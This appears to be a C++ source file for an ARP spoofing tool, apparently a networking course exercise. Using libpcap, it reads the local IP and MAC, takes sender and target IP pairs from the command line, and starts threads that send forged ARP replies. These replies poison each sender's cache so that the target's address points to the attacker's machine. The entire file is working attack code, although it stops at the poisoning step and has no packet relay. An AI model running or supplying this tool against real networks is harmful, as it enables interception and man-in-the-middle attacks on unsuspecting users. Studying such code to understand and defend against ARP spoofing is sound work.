#include "MyARP.h"
#include <glog/logging.h>

#define MAX_SESSION_NUM 100

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int thread_idx= 0;
bool isSpoofing;
IPaddr sender_ip[MAX_SESSION_NUM], target_ip[MAX_SESSION_NUM], attacker_ip;
HWaddr attacker_ha;
char *interface;

bool ARPCachePoisoning(pcap_t *handle, const HWaddr sha, const IPaddr sip, const HWaddr aha, const IPaddr tip)
{
    ARPpkt pkt;

    makeARPPacket(&pkt, aha, tip, sha, sip, ARPOP_REPLY);
    if(pcap_sendpacket(handle, (u_char *)&pkt, sizeof(pkt)) != 0)
    {
        LOG(FATAL) << "pcap_sendpacket : failed";
        return false;
    }
    return true;
}

void *ARPSpoofing(void *)
{
    IPaddr sip, tip;
    HWaddr sha, tha;
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];

    pthread_mutex_lock(&mutex);
    sip = sender_ip[thread_idx];
    tip = target_ip[thread_idx];
    thread_idx++;
    pthread_mutex_unlock(&mutex);

    LOG(INFO) << "pcap_open_live";
    if((handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf))==NULL)
    {
        LOG(FATAL) << "pcap_open_live : failed";
        return NULL;
    }

    LOG(INFO) << "getHWaddrbyIPaddr(sender)";
    if(!getHWaddrByIPaddr(&sha, handle, attacker_ha, attacker_ip, sip))
    {
        LOG(FATAL) << "getHWaddrbyIPaddr : failed";
        return NULL;
    }
/*
    LOG(INFO) << "getHWaddrbyIPaddr(target)";
    if(!getHWaddrByIPaddr(&tha, handle, attacker_ha, attacker_ip, tip))
    {
        LOG(FATAL) << "getHWaddrbyIPaddr : failed";
        return (void *)-1;
    }
*/
    if(!ARPCachePoisoning(handle, sha, sip, attacker_ha, tip))
    {
        LOG(FATAL) << "ARPCachePoisoning : failed";
        return NULL;
    }

    while(isSpoofing)
    {
        
    }

    pthread_exit(NULL);
}

int main(int argc, char **argv)
{
    int         session_num;
    pthread_t   threads[MAX_SESSION_NUM];
    int         i;

    google::InitGoogleLogging(argv[0]);

    if(argc < 4 || argc > 2 + 2*MAX_SESSION_NUM || argc%2 == 1)
    {
        printf("Usage : %s <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ... <sender ip 100> <target ip 100>]", argv[0]);
        return -1;
    }

    session_num = argc/2 - 1;
    interface = argv[1];

    getMyIPaddr(&attacker_ip, interface);
    getMyHWaddr(&attacker_ha, interface);

    LOG(INFO) << "attacker_ip : " << inet_ntoa(attacker_ip);
    LOG(INFO) << "attacker_ha : " << ether_ntoa(&attacker_ha);

    for(i=0;i<session_num;i++)
    {
        inet_pton(AF_INET, argv[i*2 + 2], &sender_ip[i]);
        inet_pton(AF_INET, argv[i*2 + 3], &target_ip[i]);

        LOG(INFO) << "sender_ip[" << i << "] : " << inet_ntoa(sender_ip[i]);
        LOG(INFO) << "target_ip[" << i << "] : " << inet_ntoa(target_ip[i]);
    }

    isSpoofing = true;

    for(i=0;i<session_num;i++)
    {
        pthread_create(&threads[i], NULL, ARPSpoofing, NULL);
    }

    printf("Press any button to stop ARP spoofing\n");
    getchar();

    isSpoofing = false;

    return 0;
}